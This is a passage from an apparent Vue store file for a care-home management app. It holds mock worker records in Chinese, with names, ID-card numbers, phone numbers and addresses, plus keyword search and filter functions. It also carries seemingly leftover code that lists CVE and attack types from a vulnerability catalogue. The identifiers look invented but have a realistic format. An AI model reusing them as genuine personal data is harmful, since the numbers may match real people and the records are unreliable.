      "residentialAddress": "厦门市思明区环岛路 5 号",
      "telephoneNumber": "13606061122",
      "emergencyContact": "13606062233",
      "score": 4.8,
      "selfDescription": "经历过大风大浪的人，性格沉稳。喜欢大海，爱喝功夫茶，对人非常有礼貌。"
    },
    {
      "id": "A0015",
      "name": "何大清",
      "sex": "男",
      "age": 79,
      "nativePlace": "天津市和平区",
      "domicileAddress": "天津市和平区南京路 20 号",
      "citizenship": "中国",
      "nationality": "汉族",
      "politicsStatus": "群众",
      "maritalStatus": "丧偶",
      "certificateType": "身份证",
      "certificateNumber": "120101194502023344",
      "education": "中专",
      "originalUnits": "天津饭店",
      "originalOccupation": "厨师",
      "residentialAddress": "天津市和平区南京路 20 号",
      "telephoneNumber": "13000112244",
      "emergencyContact": "13000113355",
      "score": 4.5,
      "selfDescription": "做了一辈子鲁菜，嘴碎心软。喜欢听相声，没事爱点评一下伙食，是个老顽童。"
    },
    {
      "id": "A0016",
      "name": "马冬梅",
      "sex": "女",
      "age": 67,
      "nativePlace": "辽宁省大连市",
      "domicileAddress": "大连市中山区友好广场 1 号",
      "citizenship": "中国",
      "nationality": "汉族",
      "politicsStatus": "群众",
      "maritalStatus": "已婚",
      "certificateType": "身份证",
      "certificateNumber": "210202195711204455",
      "education": "高中",
      "originalUnits": "大连造船厂",
      "originalOccupation": "质检员",
      "residentialAddress": "大连市中山区友好广场 1 号",
      "telephoneNumber": "13942001122",
      "emergencyContact": "13942002233",
      "score": 4.3,
      "selfDescription": "做事认真严谨，在大连海边长大。性格开朗直接，爱干净，特别擅长包饺子。"
    },
    {
      "id": "A0017",
      "name": "郭德柱",
      "sex": "男",
      "age": 82,
      "nativePlace": "山东省济南市",
      "domicileAddress": "济南市历下区泉城路 10 号",
      "citizenship": "中国",
      "nationality": "汉族",
      "politicsStatus": "党员",
      "maritalStatus": "已婚",
      "certificateType": "身份证",
      "certificateNumber": "370102194205051122",
      "education": "本科",
      "originalUnits": "济南钢铁厂",
      "originalOccupation": "厂长",
      "residentialAddress": "济南市历下区泉城路 10 号",
      "telephoneNumber": "13366778811",
      "emergencyContact": "13366779922",
      "score": 4.9,
      "selfDescription": "退下来的老干部，威信高，心态稳。喜欢看报纸、看新闻，关心国家大事。"
    },
    {
      "id": "A0018",
      "name": "周润发",
      "sex": "男",
      "age": 65,
      "nativePlace": "广东省深圳市",
      "domicileAddress": "深圳市福田区深南大道 1 号",
      "citizenship": "中国",
      "nationality": "汉族",
      "politicsStatus": "群众",
      "maritalStatus": "已婚",
      "certificateType": "身份证",
      "certificateNumber": "440304195912253344",
      "education": "大专",
      "originalUnits": "深圳华强北商城",
      "originalOccupation": "经理",
      "residentialAddress": "深圳市福田区深南大道 1 号",
      "telephoneNumber": "13888889999",
      "emergencyContact": "13888880000",
      "score": 4.6,
      "selfDescription": "赶上了深圳建设的好时代。性格幽默，爱摄影，紧跟时代潮流，智能手机玩得特别溜。"
    },
    {
      "id": "A0019",
      "name": "林黛玉",
      "sex": "女",
      "age": 74,
      "nativePlace": "安徽省黄山市",
      "domicileAddress": "黄山市屯溪区老街 8 号",
      "citizenship": "中国",
      "nationality": "汉族",
      "politicsStatus": "群众",
      "maritalStatus": "未婚",
      "certificateType": "身份证",
      "certificateNumber": "341002195010101122",
      "education": "本科",
      "originalUnits": "黄山书院",
      "originalOccupation": "书法家",
      "residentialAddress": "黄山市屯溪区老街 8 号",
      "telephoneNumber": "13100223344",
      "emergencyContact": "13100224455",
      "score": 4.4,
      "selfDescription": "一辈子与笔墨为伴。心境淡泊，喜欢安静，希望能在养老院度过一段宁静的时光。"
    },
    {
      "id": "A0020",
      "name": "白展堂",
      "sex": "男",
      "age": 68,
      "nativePlace": "宁夏省银川市",
      "domicileAddress": "银川市金凤区北京中路 100 号",
      "citizenship": "中国",
      "nationality": "回族",
      "politicsStatus": "其他",
      "maritalStatus": "已婚",
      "certificateType": "身份证",
      "certificateNumber": "640106195603031122",
      "education": "中专",
      "originalUnits": "同福客栈",
      "originalOccupation": "个体户",
      "residentialAddress": "银川市金凤区北京中路 100 号",
      "telephoneNumber": "15109512233",
      "emergencyContact": "15109513344",
      "score": 4.2,
      "selfDescription": "走南闯北，生活经验丰富。爱说笑话，懂点养生推拿，是个走到哪都能活络气氛的人。"
    }
  ])
  const cveTypes = computed(() => {
    const types = [...new Set(vulnerabilities.value.map(v => v.cveType))]
    return types.map(type => ({
      label: type,
      value: type
    }))
  })

  const attackTypes = computed(() => {
    const types = [...new Set(vulnerabilities.value.map(v => v.attackType))]
    return types.map(type => ({
      label: type,
      value: type
    }))
  })

  const architectures = computed(() => {
    const archs = []
    vulnerabilities.value.forEach(v => {
      v.architecture.split('、').forEach(a => {
        if (!archs.includes(a)) archs.push(a)
      })
    })
    return archs.map(a => ({ label: a, value: a }))
  })

  const getVulnById = (id) => {
    return vulnerabilities.value.find(v => v.id === parseInt(id))
  }

  const searchUsers = (keyword, filters = {}) => {
    let results = users.value

    if (keyword) {
      const kw = keyword.toLowerCase()
      results = results.filter(v =>
          v.id.toLowerCase().includes(kw) ||
          v.name.toLowerCase().includes(kw) ||
          v.sex.toLowerCase().includes(kw) ||
          v.nativePlace.toLowerCase().includes(kw) ||
          v.domicileAddress.toLowerCase().includes(kw) ||
          v.citizenship.toLowerCase().includes(kw) ||
          v.nationality.toLowerCase().includes(kw) ||
          v.politicsStatus.toLowerCase().includes(kw) ||
          v.maritalStatus.toLowerCase().includes(kw) ||
          v.certificateNumber.toLowerCase().includes(kw) ||
          v.education.toLowerCase().includes(kw) ||
          v.originalUnits.toLowerCase().includes(kw) ||
          v.originalOccupation.toLowerCase().includes(kw) ||
          v.residentialAddress.toLowerCase().includes(kw) ||
          v.telephoneNumber.toLowerCase().includes(kw) ||
          v.medicareDesignatedHospital.toLowerCase().includes(kw) ||
          v.socialSecurityCardNumber.toLowerCase().includes(kw) ||
          v.pocketbook.toLowerCase().includes(kw) ||
          v.reasonCheckin.toLowerCase().includes(kw) ||
          v.actionCapability.toLowerCase().includes(kw) ||
          v.bunk.toLowerCase().includes(kw)
      )
    }

    if (filters.sex) {
      results = results.filter(v => v.sex === filters.sex)
    }
    if (filters.education) {
      results = results.filter(v => v.education === filters.education)
    }
    if (filters.maritalStatus) {
      results = results.filter(v => v.maritalStatus.includes(filters.maritalStatus))
    }
    if (filters.actionCapability) {
      results = results.filter(v => v.actionCapability === filters.actionCapability)
    }

    return results
  }

  const searchWorkers = (keyword, filters = {}) => {
    let results = workers.value

    if (keyword) {
      const kw = keyword.toLowerCase()
      results = results.filter(v =>
          v.id.toLowerCase().includes(kw) ||
          v.name.toLowerCase().includes(kw) ||
          v.sex.toLowerCase().includes(kw) ||
          v.nativePlace.toLowerCase().includes(kw) ||
          v.domicileAddress.toLowerCase().includes(kw) ||
          v.citizenship.toLowerCase().includes(kw) ||
          v.nationality.toLowerCase().includes(kw) ||
          v.politicsStatus.toLowerCase().includes(kw) ||
          v.maritalStatus.toLowerCase().includes(kw) ||
          v.certificateNumber.toLowerCase().includes(kw) ||
          v.education.toLowerCase().includes(kw) ||
          v.originalUnits.toLowerCase().includes(kw) ||
          v.originalOccupation.toLowerCase().includes(kw) ||
          v.residentialAddress.toLowerCase().includes(kw) ||
          v.telephoneNumber.toLowerCase().includes(kw) ||
          v.selfDescription.toLowerCase().includes(kw)
      )
    }

    if (filters.sex) {
      results = results.filter(v => v.sex === filters.sex)
    }
    if (filters.education) {
      results = results.filter(v => v.education === filters.education)
    }
    if (filters.maritalStatus) {
      results = results.filter(v => v.maritalStatus.includes(filters.maritalStatus))
    }
    if (filters.politicsStatus) {
      results = results.filter(v => v.politicsStatus === filters.politicsStatus)
    }

    return results
  }

  return {
    vulnerabilities,
    stats,
    cveTypes,
    attackTypes,
    architectures,
    getVulnById,
    searchUsers,
    scoringList,
    users,
    foods,
    workers,
    searchWorkers
  }
})
